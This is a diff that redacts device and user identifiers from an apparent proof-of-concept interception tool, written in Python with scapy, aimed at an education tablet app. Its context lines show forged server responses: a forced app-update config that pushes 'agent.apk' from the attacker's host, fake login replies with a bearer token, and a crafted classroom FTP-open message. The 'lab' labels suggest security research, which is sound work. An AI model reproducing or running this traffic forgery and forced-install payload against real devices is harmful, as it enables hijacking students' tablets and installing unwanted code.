@@ -31,7 +31,7 @@ from scapy.all import Ether, IP, TCP, Raw, conf, AsyncSniffer
 from scapy.arch.windows import get_windows_if_list
 
 # === PAD-AUTODETECT (patch_pad_ip.py): 按 MAC 找平板当前 IP, 免受 DHCP 换址影响 ===
-_PAD_MAC = "80:20:fd:8b:4b:fa"
+_PAD_MAC = "<DEVICE_MAC>"
 _pad_cache = {"ip": None, "t": 0.0}
 
 
@@ -54,13 +54,13 @@ def _p200_ip():
                     return m.group(1)
     except Exception:
         pass
-    _pad_cache["ip"] = _pad_cache["ip"] or "192.168.137.154"
+    _pad_cache["ip"] = _pad_cache["ip"] or "<PAD_IP>"
     _pad_cache["t"] = now
     return _pad_cache["ip"]
 # === /PAD-AUTODETECT ===
 
 
-PAD_MAC = "80:20:fd:8b:4b:fa"
+PAD_MAC = "<DEVICE_MAC>"
 ICS_MAC = "52:bb:b5:4f:7f:3e"
 IFINDEX = 12
 PORT = 80
@@ -372,8 +372,8 @@ SYS_PORTAL = b'<!DOCTYPE html>\n<html>\n<head>\n<meta charset="utf-8">\n<meta na
 PLATFORM_APK_CFG = (b'{"url":"http://192.168.137.1/agent.apk","checksum":"2c44a3a421a1e26fcd5405e890c583ba","versionCode":999999,"appId":"CA103001","size":1866277,"forceUpdate":true}')
 
 
-EB_CRAFTED = b'{"code": 0, "msg": "ok", "data": {"questions": [{"wrongQuestionId": "WQ_LAB_0001", "questionId": "Q_LAB_0001", "questionIdsString": "Q_LAB_0001", "studentId": 2112229, "studentWorkId": "SW_LAB_0001", "workId": "W_LAB_0001", "workName": "\xe5\xae\x9e\xe9\xaa\x8c\xe9\x94\x99\xe9\xa2\x98", "subject": 1, "state": 1, "questionUserType": 1, "collectionVersion": 1, "createTime": 1791260532444, "updateTime": 1791260532444, "pictureWidth": 600, "pictureHeight": 800, "annotationUrl": "http://192.168.137.1/eb_img.png", "pictureUrl": "http://192.168.137.1/eb_img.png", "correctedUrl": "http://192.168.137.1/eb_img.png", "isExistLecture": false, "playSpeed": 1.0, "wrongCollectionIds": ["WC_LAB_1"], "tagList": [], "topicLabels": [], "proofs": "", "children": ""}], "collections": [], "lectureExists": [], "topicNext": 0}}'
-EB_CATEGORY = b'{"code":0,"msg":"ok","data":[{"wrongCollectionId":"WC_LAB_1","name":"\xe5\xae\x9e\xe9\xaa\x8c","allNum":1,"state":1,"studentId":2112229,"createTime":1,"updateTime":1,"questionUserTypes":[1]}]}'
+EB_CRAFTED = b'{"code": 0, "msg": "ok", "data": {"questions": [{"wrongQuestionId": "WQ_LAB_0001", "questionId": "Q_LAB_0001", "questionIdsString": "Q_LAB_0001", "studentId": <USER_ID>, "studentWorkId": "SW_LAB_0001", "workId": "W_LAB_0001", "workName": "\xe5\xae\x9e\xe9\xaa\x8c\xe9\x94\x99\xe9\xa2\x98", "subject": 1, "state": 1, "questionUserType": 1, "collectionVersion": 1, "createTime": 1791260532444, "updateTime": 1791260532444, "pictureWidth": 600, "pictureHeight": 800, "annotationUrl": "http://192.168.137.1/eb_img.png", "pictureUrl": "http://192.168.137.1/eb_img.png", "correctedUrl": "http://192.168.137.1/eb_img.png", "isExistLecture": false, "playSpeed": 1.0, "wrongCollectionIds": ["WC_LAB_1"], "tagList": [], "topicLabels": [], "proofs": "", "children": ""}], "collections": [], "lectureExists": [], "topicNext": 0}}'
+EB_CATEGORY = b'{"code":0,"msg":"ok","data":[{"wrongCollectionId":"WC_LAB_1","name":"\xe5\xae\x9e\xe9\xaa\x8c","allNum":1,"state":1,"studentId":<USER_ID>,"createTime":1,"updateTime":1,"questionUserTypes":[1]}]}'
 
 def dns_public(host, servers=("223.5.5.5", "114.114.114.114", "8.8.8.8")):
     """公共 DNS 解析(手写 DNS 报文, 完全绕过本机 hosts)。返回 IP 列表。"""
@@ -1403,7 +1403,7 @@ def build_response(path, body=b"", host="", method="GET"):
                         _recs = []
                     _media = "http://%s/poc7z.7z" % OUR_IP
                     _new = {
-                        "videoId": "LABV1", "userId": 2112229,
+                        "videoId": "LABV1", "userId": <USER_ID>,
                         "createTime": _now, "classroomId": "UXHOVJJF",
                         "classroomName": "lab", "mediaUrl": _media,
                         "timeLength": 1, "status": 1, "changeStatus": 1,
@@ -1591,7 +1591,7 @@ def build_response(path, body=b"", host="", method="GET"):
                 wlog("!!!!!! [MICRO-REWRITE] \u767b\u5f55\u54cd\u5e94\u5df2\u6539\u5199: %s | %dB" % ("; ".join(_mr[:6]), len(_pb2)))
             return _resp(_pb2, _pct)
         _obj = {"code": 200, "message": "success", "data": {
-            "userInfo": {"userId": 2112229, "username": "student", "userType": 2,
+            "userInfo": {"userId": <USER_ID>, "username": "student", "userType": 2,
                          "schoolId": 1000, "schoolName": "school",
                          "token": "bearer_lab_token", "phone": "", "role": 1,
                          "environment": 1},
@@ -1917,7 +1917,7 @@ def build_response(path, body=b"", host="", method="GET"):
                 "smsg": {"classRoomId": (os.environ.get("CLASS_ID") or "UXHOVJJF"),
                          "createTag": "default_tag", "data": _ftpdata, "forward": 0,
                          "senderId": 0, "type": 50001,
-                         "userIds": (os.environ.get("USER_IDS") or "2112229")}}
+                         "userIds": (os.environ.get("USER_IDS") or "<USER_ID>")}}
         wlog("!!!!!! [CLASSROOM-HOST] %s%s -> 回 OPEN_FTP(50001) 信封" % (host, path[:60]))
         return _resp(json.dumps(_env, ensure_ascii=False).encode("utf-8"),
                      "application/json; charset=UTF-8")
